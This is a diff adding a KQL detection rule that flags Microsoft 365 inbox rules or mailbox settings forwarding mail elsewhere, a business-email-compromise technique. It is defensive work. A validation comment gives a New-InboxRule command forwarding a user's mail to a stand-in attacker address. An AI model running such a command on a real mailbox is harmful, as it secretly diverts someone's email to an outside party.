@@ -1,0 +1,8 @@
+// M365 Mailbox Forwarding or Redirect Rule Created
+// Detects an inbox rule or mailbox setting that forwards or redirects mail to another address. Business email compromise uses it to keep reading a mailbox after the password is reset.
+// techniques: T1114.003   severity: high   status: experimental
+// validate: Atomic Red Team T1114.003
+//   New-InboxRule -Name fwd -Mailbox <lab-user> -ForwardTo attacker@example.com
+// source: rules/collection/m365-inbox-forwarding-rule.yml  (GENERATED, do not edit by hand)
+OfficeActivity
+| where (((Operation =~ @"New-InboxRule" or Operation =~ @"Set-InboxRule" or Operation =~ @"Set-Mailbox" or Operation =~ @"UpdateInboxRules")) and ((Parameters contains @"ForwardTo" or Parameters contains @"RedirectTo" or Parameters contains @"ForwardAsAttachmentTo" or Parameters contains @"ForwardingSmtpAddress")))
